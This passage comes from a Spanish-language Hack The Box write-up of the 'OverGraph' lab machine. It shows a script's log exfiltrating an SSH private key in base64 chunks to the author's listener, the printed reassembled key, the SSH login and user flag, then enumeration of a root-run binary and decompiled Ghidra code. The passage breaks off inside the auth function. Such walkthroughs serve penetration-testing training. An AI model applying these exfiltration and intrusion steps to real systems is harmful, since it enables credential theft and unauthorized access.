</code></pre></div><p>Como va a ser muy aburrido extraer el archivo entero de forma manual, es mejor usar un <em>script</em> en Python para automatizarlo: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph/extract_id_rsa.py"><code>extract_id_rsa.py</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph#extract_id_rsapy">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">extract_file.py</span> 10.10.17.44 c0b9db4c8e4bbb24d59a3aaffa8c8b83
 * Serving Flask app 'extract_file' (lazy loading)
 * Environment: production
<span class="code-dark-red">   WARNING: This is a development server. Do not use it in a production deployment.</span>
<span class="code-grey">   Use a production WSGI server instead.</span>
 * Debug mode: on
 * Running on all addresses (0.0.0.0)
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://0.0.0.0:80 (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: XXX-XXX-XXX
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /?d=b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW HTTP/1.1" 200 -  
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /?d=QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /?d=1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /?d=AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /?d=3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw== HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] code 400, message Bad request syntax ('GET /?d=-----END OPENSSH PRIVATE KEY----- HTTP/1.1')
10.10.11.157 - - [] "<span class="code-magenta">GET /?d=-----END OPENSSH PRIVATE KEY----- HTTP/1.1</span>" HTTPStatus.BAD_REQUEST -
^C

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">id_rsa</span>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd
1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA
AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2
3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Y ahora tenemos acceso a la máquina mediante SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> 600 <span class="mtku">id_rsa</span>

<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> user@10.10.11.157  
<span class="code-green">user@overgraph</span>:<span class="code-blue">~</span>$ cat user.txt
09753d50eb14c51fc58b94afb5eedcc3
</code></pre></div><p>Al analizar procesos en ejecución como <code>root</code>, vemos uno extraño:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">user@overgraph</span>:<span class="code-blue">~</span>$ ps -faux | grep root
...
<span class="code-red">root</span>        8623  0.0  0.0      0     0 ?        I    14:41   0:00  \_ [kworker/0:2-events]
<span class="code-red">root</span>        8656  0.0  0.0      0     0 ?        I    14:45   0:00  \_ [kworker/u256:0-events_power_efficient]
<span class="code-red">root</span>           1  0.0  0.2 103796 11208 ?        Ss   Jul31   0:04 /sbin/init maybe-ubiquity
<span class="code-red">root</span>         491  0.0  0.4  67848 16268 ?        S&lt;s  Jul31   0:01 /lib/systemd/systemd-journald
<span class="code-red">root</span>         517  0.0  0.1  21368  5436 ?        Ss   Jul31   0:01 /lib/systemd/systemd-udevd
<span class="code-red">root</span>         662  0.0  0.4 214596 17944 ?        SLsl Jul31   0:06 /sbin/multipathd -d -s
<span class="code-red">root</span>         705  0.0  0.2  47540 10608 ?        Ss   Jul31   0:00 /usr/bin/VGAuthService
<span class="code-red">root</span>         710  0.1  0.2 311508  8332 ?        Ssl  Jul31   0:58 /usr/bin/vmtoolsd
<span class="code-red">root</span>         711  0.0  0.1  99896  5804 ?        Ssl  Jul31   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0  
<span class="code-red">root</span>         756  0.0  0.2 239276  9268 ?        Ssl  Jul31   0:01 /usr/lib/accountsservice/accounts-daemon
<span class="code-red">root</span>         780  0.0  0.0  81956  3788 ?        Ssl  Jul31   0:02 /usr/sbin/irqbalance --foreground
<span class="code-red">root</span>         787  0.0  0.1  16660  7756 ?        Ss   Jul31   0:00 /lib/systemd/systemd-logind
<span class="code-red">root</span>         788  0.0  0.3 394876 13472 ?        Ssl  Jul31   0:00 /usr/lib/udisks2/udisksd
<span class="code-red">root</span>         815  0.0  0.2 236416  9100 ?        Ssl  Jul31   0:00 /usr/lib/policykit-1/polkitd --no-debug
<span class="code-red">root</span>         932  0.0  0.0   6812  2996 ?        Ss   Jul31   0:00 /usr/sbin/cron -f
<span class="code-red">root</span>         933  0.0  0.0   8480  3384 ?        S    Jul31   0:00  \_ /usr/sbin/CRON -f
<span class="code-red">root</span>         934  0.0  0.0   8480  3384 ?        S    Jul31   0:00  \_ /usr/sbin/CRON -f
<span class="code-red">root</span>         935  0.0  0.0   8352  3356 ?        S    Jul31   0:00  \_ /usr/sbin/CRON -f
<span class="code-red">root</span>         949  0.0  0.0   2608   536 ?        Ss   Jul31   0:00      \_ /bin/sh -c sh -c 'socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr'
<span class="code-red">root</span>         950  0.0  0.0   2608   536 ?        S    Jul31   0:00          \_ sh -c socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
<span class="code-red">root</span>         951  0.0  0.0   6964  1828 ?        S    Jul31   0:00              \_ socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
<span class="code-red">root</span>         964  0.0  0.1  12172  7324 ?        Ss   Jul31   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
<span class="code-red">root</span>        8687  0.0  0.2  13660  8772 ?        Ss   14:46   0:00  \_ sshd: user [priv]
user        8804  0.0  0.0   6300   656 pts/0    S+   14:48   0:00              \_ grep --color=auto <span class="code-red">root</span>
<span class="code-red">root</span>         966  0.0  0.0  55276  1564 ?        Ss   Jul31   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
<span class="code-red">root</span>         970  0.0  0.0   5828  1824 tty1     Ss+  Jul31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
<span class="code-red">root</span>         981  0.0  0.1   6532  5004 ?        Ss   Jul31   0:02 /usr/sbin/apache2 -k start
</code></pre></div><p>Se trata de este comando:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr  
</code></pre></div><p>El comando ejecuta un archivo binario en <code>/usr/local/bin/Nreport/nreport</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">user@overgraph</span>:<span class="code-blue">~</span>$ file /usr/local/bin/Nreport/nreport
/usr/local/bin/Nreport/nreport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/local/bin/Nreport/libc/ld-2.25.so, for GNU/Linux 3.2.0, BuildID[sha1]=fab56bbb7a23ada8a8f5943b527d16f3cdcb09e5, not stripped  

<span class="code-green">user@overgraph</span>:<span class="code-blue">~</span>$ ls -l /usr/local/bin/Nreport/nreport
-rwxr-xr-x 1 root root 26040 Feb 14 12:30 <span class="code-green">/usr/local/bin/Nreport/nreport
</code></pre></div><p>Es muy probable que tengamos que explotar este binario para convertirnos en <code>root</code>. Vamos a descargar el binario para analizarlo con Ghidra:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">user@overgraph</span>:<span class="code-blue">~</span>$ cd /usr/local/bin/Nreport/
<span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ python3 -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.17.44 - - [] "GET /nreport HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 10.10.11.157:8000/nreport  
</code></pre></div><p>Además, sería bueno descargar las librerías compartidas usadas por el binario para tener el mismo entorno de trabajo que en la máquina remota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ ll
total 40
drwxr-xr-x 3 root root  4096 Apr 12 17:38 <span class="code-blue">.</span>/
drwxr-xr-x 3 root root  4096 Apr 12 17:38 <span class="code-blue">..</span>/
drwxr-xr-x 2 root root  4096 Feb 14 18:31 <span class="code-blue">libc</span>/
-rwxr-xr-x 1 root root 26040 Feb 14 12:30 <span class="code-green">nreport</span>*
<span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ ll libc/
total 31716
drwxr-xr-x 2 root root     4096 Feb 14 18:31 <span class="code-blue">.</span>/
drwxr-xr-x 3 root root     4096 Apr 12 17:38 <span class="code-blue">..</span>/
-rwxr-xr-x 1 root root  1250280 Feb 13 14:17 <span class="code-green">ld-2.25.so</span>*
-rwxr-xr-x 1 root root  1250280 Feb 13 14:17 <span class="code-green">ld.so.2</span>*
-rwxr-xr-x 1 root root 14979184 Feb 14 18:29 <span class="code-green">libc-2.25.so</span>*
-rwxr-xr-x 1 root root 14978536 Feb 13 14:17 <span class="code-green">libc.so.6</span>*
<span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.17.44 - - [01/Aug/2022 15:36:57] "GET /libc/libc.so.6 HTTP/1.1" 200 -
10.10.17.44 - - [01/Aug/2022 15:37:18] "GET /libc/libc-2.25.so HTTP/1.1" 200 -  
10.10.17.44 - - [01/Aug/2022 15:37:43] "GET /libc/ld-2.25.so HTTP/1.1" 200 -
10.10.17.44 - - [01/Aug/2022 15:37:48] "GET /libc/ld.so.2 HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">mkdir</span> libc

<span class="code-cyan">$</span> <span class="code-dark-green">cd</span> <span class="mtku">libc</span>

<span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 10.10.11.157:8000/libc/{libc.so.6,libc-2.25.so,ld.so.2,ld-2.25.so}  
</code></pre></div><p>Usando <a href="https://github.com/io12/pwninit"><code>pwninit</code></a>, podemos parchear el binario de manera que use la librería compartida y el <em>loader</em> que le indiquemos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pwninit</span> --libc <span class="mtku">libc/libc.so.6</span> --ld <span class="mtku">libc/ld.so.2</span> --bin <span class="mtku">nreport</span> --no-template
<span class="code-dark-blue">bin</span>: <span class="code-blue">nreport</span>
<span class="code-dark-yellow">libc</span>: <span class="code-yellow">libc/libc.so.6</span>
<span class="code-dark-green">ld</span>: <span class="code-green">libc/ld.so.2</span>

<span class="code-magenta">warning: failed detecting libc version (is the libc an Ubuntu glibc?): failed finding version string</span>  
<span class="code-dark-green">copying <span class="code-green">nreport<span class="code-dark-green"> to <span class="code-green">nreport_patched</span>
<span class="code-dark-green">running patchelf on <span class="code-green">nreport_patched
</code></pre></div><h2 id="analizando-el-binario-nreport">Analizando el binario <code>nreport</code></h2><p>Esta es la función <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> iVar1;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> option[</span><span class="mtk6">3</span><span class="mtk1">];</span>
<span class="mtk1">  undefined8 canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Custom Reporting v1</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">auth</span><span class="mtk1">();</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Welcome </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, userinfo1);</span>

<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">1.Create New Message</span><span class="mtk6">\n</span><span class="mtk4">2.Delete a Message</span><span class="mtk6">\n</span><span class="mtk4">3.Edit Messages</span><span class="mtk6">\n</span><span class="mtk4">4.Report All Messages</span><span class="mtk6">\n</span><span class="mtk4">5.Exit"</span><span class="mtk1">);</span>  
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"&gt; "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">" </span><span class="mtk10">%</span><span class="mtk4">1[^</span><span class="mtk6">\n</span><span class="mtk4">]"</span><span class="mtk1">, option);</span>
<span class="mtk1">    iVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">atoi</span><span class="mtk1">(option);</span>

<span class="mtk1">    </span><span class="mtk5">switch</span><span class="mtk1"> (iVar1) {</span>
<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk8">create</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk8">delete</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk8">edit</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk8">report</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk8">system</span><span class="mtk1">(userinfo1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Lo primer que hace es llamar a <code>auth</code> y solicitar un <em>token</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ ./nreport  
Custom Reporting v1

Enter Your Token: 1234
Invalid Token
</code></pre></div><p>Esta es la función <code>auth</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">auth</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> sVar1;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> i;</span>
<span class="mtk1">  undefined8 local_48;</span>
<span class="mtk1">  undefined8 local_40;</span>
<span class="mtk1">  undefined8 local_38;</span>
<span class="mtk1">  undefined8 local_30;</span>
<span class="mtk1">  undefined8 local_28;</span>
<span class="mtk1">  undefined8 local_20;</span>
<span class="mtk1">  undefined8 local_18;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  local_48 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  local_40 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  local_38 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  local_30 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  local_28 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  local_20 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  local_18 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter Your Token: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">fgets</span><span class="mtk1">(userinfo1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">78</span><span class="mtk1">,</span> <span class="mtk6">19</span><span class="mtk1">, stdin);</span>
<span class="mtk1">  sVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(userinfo1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">78</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (sVar1 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">15</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid Token"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">13</span><span class="mtk1">; </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> i; i </span><span class="mtk5">=</span><span class="mtk1"> i </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">uint</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">local_48 </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) </span><span class="mtk5">=</span>
<span class="mtk1">         </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">uint</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (secret </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) </span><span class="mtk5">^</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) userinfo1[</span><span class="mtk6">121</span><span class="mtk1">] </span><span class="mtk5">^</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) userinfo1[</span><span class="mtk6">122</span><span class="mtk1">] </span><span class="mtk5">^</span>  
<span class="mtk1">         (</span><span class="mtk7 mtki">int</span><span class="mtk1">) userinfo1[</span><span class="mtk6">120</span><span class="mtk1">] </span><span class="mtk5">^</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) userinfo1[</span><span class="mtk6">129</span><span class="mtk1">] </span><span class="mtk5">^</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) userinfo1[</span><span class="mtk6">133</span><span class="mtk1">];</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk7 mtki">int</span><span class="mtk1">) local_40 </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) local_48 </span><span class="mtk5">+</span><span class="mtk1"> local_48._4_4_ </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">134</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid Token"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (local_28._4_4_ </span><span class="mtk5">+</span><span class="mtk1"> local_30._4_4_ </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) local_28 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">145</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid Token"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (local_18._4_4_ </span><span class="mtk5">+</span><span class="mtk1"> local_20._4_4_ </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) local_18 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">109</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid Token"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter Name: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">" </span><span class="mtk10">%</span><span class="mtk4">39[^</span><span class="mtk6">\n</span><span class="mtk4">]"</span><span class="mtk1">, userinfo1);</span>
<span class="mtk1">  userinfo1._140_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">7672632f74706f2f</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1._148_2_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">2f31</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1[</span><span class="mtk6">150</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk8">strcat</span><span class="mtk1">(userinfo1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">8c</span><span class="mtk1">, userinfo1);</span>
<span class="mtk1">  userinfo1._40_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">614c22206f686365</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1._48_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">2064657355207473</span><span class="mtk1">;</span>
